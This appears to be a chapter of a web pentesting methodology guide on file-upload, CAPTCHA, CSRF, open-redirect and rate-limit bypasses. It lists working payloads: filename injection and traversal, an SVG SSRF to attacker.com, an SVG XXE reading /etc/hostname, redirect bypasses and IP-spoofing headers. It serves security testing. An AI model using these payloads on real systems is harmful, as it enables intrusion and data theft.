# 6. File Upload & Other Vulnerabilities

## File Upload

### Impactful Formats

| Extension | Potential Impact |
|---|---|
| ASP, ASPX, PHP5, PHP, PHP3 | Web shell → RCE |
| SVG | Stored XSS, SSRF, XXE |
| GIF | Stored XSS, SSRF |
| CSV | CSV Injection |
| XML | XXE |
| AVI | LFI, SSRF |
| HTML, JS | HTML Injection, XSS, Open Redirect |
| PNG, JPEG | Pixel Flood Attack (DoS) |
| ZIP | Possible RCE via LFI, DoS |
| PDF, PPTX | SSRF, Blind XXE |

### Blacklist Bypass

- PHP → `.phtm`, `.phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
- ASP → `.asp`, `.aspx`, `.cer`, `.asa`
- JSP → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
- ColdFusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
- Random capitalization → `pHp`, `pHP5`, `PhAr`

### Whitelist Bypass

```
file.jpg.php
file.php.jpg
file.php.blahblahjpg
file.php%00.jpg
file.php\x00.jpg
file.php%00
file.php .jpg
file.php\r.jpg
file.php\n.png
file.php.....
file.php/
file.php.\
file.php#.jpg
file.
.php
.html
```

### Content-Type Bypass

Upload a `.php` file and manipulate the `Content-Type` header. If the app inspects file content, prepend `GIF89a;` before the payload code to spoof a valid GIF header.

### Directory Traversal

```
../../../etc/passwd/logo.png
../../logo.png   # may overwrite the site's logo
```

### SQL Injection via Filename

```
'sleep(10).png
sleep(10)-- -.jpg
```

### Command Injection via Filename

```
; sleep 10;
```

### SSRF

- Abusing an "Upload Form URL" field: if the fetched image is saved publicly, point it at an IP-logging service to capture visitor data.
- **SSRF via `.svg`:**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" />
</svg>
```

### XXE via `.svg`

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

### XSS

- Inject the XSS payload into the filename itself.
- Upload an `.svg` file containing an XSS payload.

---

## CAPTCHA Bypass

- Response manipulation.
- Reuse a previously-used CAPTCHA value.
- Try any token of the same length (`+1`/`-1` from a known-valid one).
- Remove the parameter value, or remove the whole parameter.
- Change method `POST` → `GET`/`PUT` and drop the CAPTCHA.
- Switch the body between JSON and form-encoded (or vice versa).
- Check whether the CAPTCHA answer is embedded in the page source.
- Reuse the same CAPTCHA across different session IDs.
- Add spoofed origin headers:
  ```
  X-Forwarded-Host: 127.0.0.1
  X-Forwarded-For: 127.0.0.1
  X-Originating-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Host: 127.0.0.1
  ```

## CSRF

- Check whether the token is guessable or predictable.
- Remove header-based tokens — does the request still succeed?
- Remove just the parameter's value (then both parameter and value) — still succeeds?
- Try the same CSRF token across different accounts.
- Replace the token with a random value of matching length.
- Change the request method.
- Change the `Content-Type`.
- Check for weak/absent `Referer` validation.
- Steal CSRF tokens via XSS or a CORS misconfiguration (see [API & Session Security](03-api-session-security.md)).

## Open Redirect / Sensitive Info Leak

- Search GitHub, Google Dorks, Burp history, and JS files for redirect parameters.
- **Bypass protocol whitelisting:** `//google.com` instead of `https://google.com`; manipulate the port, e.g. `https://example.com:@google.com/`.
- Chain XSS through an open redirect.
- Use the redirect parameter itself to leak sensitive data.
- **Bypass payloads for whitelisting/blacklisting:**

```
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
\yoururl.com
//yoururl.com
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com?.theirsite.com/
https://yoursite.com%23.theirsite.com/
https://yoursite?c=.theirsite.com/   (also try # \)
////yoursite.com
/////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com   (also try %09, %00, %0a, %07)
/%2F/yoururl.com
/%5Cyoururl.com
//google.com
```

## Bypassing Rate Limits on Sensitive Functions

- **IP rotation:** if rate limiting blocks by IP after a few requests, an IP-rotating proxy/extension can defeat it.
- Spoofed IP headers on every request:
  ```
  X-Originating-IP: 127.0.0.1
  X-Forwarded-For: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Host: 127.0.0.1
  X-Forwarded-Host: 127.0.0.1
  ```
  Rotate the value (`127.0.0.2`, `127.0.0.3`, ...) and try a **double** `X-Forwarded-For` header:
  ```
  X-Forwarded-For: 127.0.0.1
  X-Forwarded-For: 127.0.0.1
  ```
- Vary the `User-Agent` and cookies between requests.
- Append null bytes (`%00`, `%0d%0a`, `%0d`, `%0a`, `%09`, `%0C`, `%20`) to the endpoint (`POST /forgot-password%00 HTTP/1.1`) or after a parameter value (`email=ashraf@example.com%00`).
- Alternate a valid login attempt with an invalid one to reset a "3 strikes" IP block.
- Race conditions.
- Add a random, unexpected parameter to the request.
- Switch the request body format (JSON ↔ XML ↔ form-encoded).
- Change the request method.
- **Gmail `+`/`.` tricks:** `ashraf+1@gmail.com` or `ashraf.1@gmail.com` may route to the same inbox as `ashraf@gmail.com`, letting you generate "new" identities against a single mailbox.
- Change the API version in the URL.
